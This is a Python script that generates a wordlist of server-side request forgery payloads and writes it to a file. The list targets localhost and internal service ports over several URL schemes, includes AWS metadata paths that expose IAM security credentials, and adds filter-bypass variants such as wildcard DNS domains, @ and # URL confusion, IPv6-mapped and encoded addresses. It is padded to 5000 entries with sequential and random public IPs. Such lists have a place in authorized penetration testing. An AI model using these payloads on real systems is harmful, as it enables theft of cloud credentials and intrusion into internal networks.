#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_ssrf():
    p = set()

    # ========== 1. BASIC SSRF (100+) ==========
    ips = ["127.0.0.1", "0.0.0.0", "localhost", "169.254.169.254"]
    protocols = ["http://", "https://", "file://", "gopher://", "dict://"]
    ports = ["", ":80", ":8080", ":443", ":22", ":3306", ":5432", ":6379"]

    for proto in protocols:
        for ip in ips:
            for port in ports:
                p.add(f"{proto}{ip}{port}")
                p.add(f"{proto}{ip}{port}/")

    # ========== 2. AWS METADATA (20+) ==========
    aws = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/meta-data/subnet-id",
        "http://169.254.169.254/latest/meta-data/vpc-id",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"
    ]
    p.update(aws)

    # ========== 3. IP / DOMAIN BYPASS (200+) ==========
    bypass = [
        "http://127.0.0.1.xip.io",
        "http://localhost.xip.io",
        "http://0.0.0.0.xip.io",
        "http://127.0.0.1.nip.io",
        "http://localhost.nip.io",
        "http://0.0.0.0.nip.io",
        "http://127.0.0.1.sslip.io",
        "http://localhost.sslip.io",
        "http://0.0.0.0.sslip.io",
        "http://127.0.0.1.anything.com",
        "http://localhost.anything.com",
        "http://0.0.0.0.anything.com",
        "http://127.0.0.1@google.com",
        "http://localhost@google.com",
        "http://0.0.0.0@google.com",
        "http://google.com@127.0.0.1",
        "http://google.com@localhost",
        "http://google.com@0.0.0.0",
        "http://127.0.0.1#google.com",
        "http://localhost#google.com",
        "http://0.0.0.0#google.com",
        "http://127.0.0.1.google.com",
        "http://localhost.google.com",
        "http://0.0.0.0.google.com",
        "http://[::1]",
        "http://[::1]/",
        "http://[::1]:80",
        "http://[::1]:8080",
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:127.0.0.1]/",
        "http://[::ffff:0:127.0.0.1]",
        "http://[::ffff:0:127.0.0.1]/",
        "http://127.0.0.1%2e.google.com",
        "http://localhost%2e.google.com",
        "http://0.0.0.0%2e.google.com",
        "http://127.0.0.1%252e",
        "http://localhost%252e",
        "http://0.0.0.0%252e",
        "http://127.0.0.1.000",
        "http://localhost.000",
        "http://0.0.0.0.000",
    ]
    p.update(bypass)

    # ========== 4. IPv4 OCTET VARIATIONS (1000+) ==========
    for a in range(1, 255):
        for b in range(1, 255):
            for c in range(1, 255):
                for d in range(1, 255):
                    if a == 127 and b == 0 and c == 0 and d == 1:
                        continue
                    if len(p) > 3000:
                        break
                    p.add(f"http://{a}.{b}.{c}.{d}")
                    p.add(f"http://{a}.{b}.{c}.{d}:80")
                    p.add(f"http://{a}.{b}.{c}.{d}:8080")
                if len(p) > 3000:
                    break
            if len(p) > 3000:
                break
        if len(p) > 3000:
            break

    # ========== 5. RANDOM (1000+) ==========
    while len(p) < 5000:
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        p.add(f"http://{ip}")
        p.add(f"http://{ip}:80")
        p.add(f"http://{ip}:8080")
        p.add(f"http://{ip}:443")
        p.add(f"https://{ip}")
        p.add(f"https://{ip}/")

    # ========== 6. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "ssrf.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] ssrf.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_ssrf()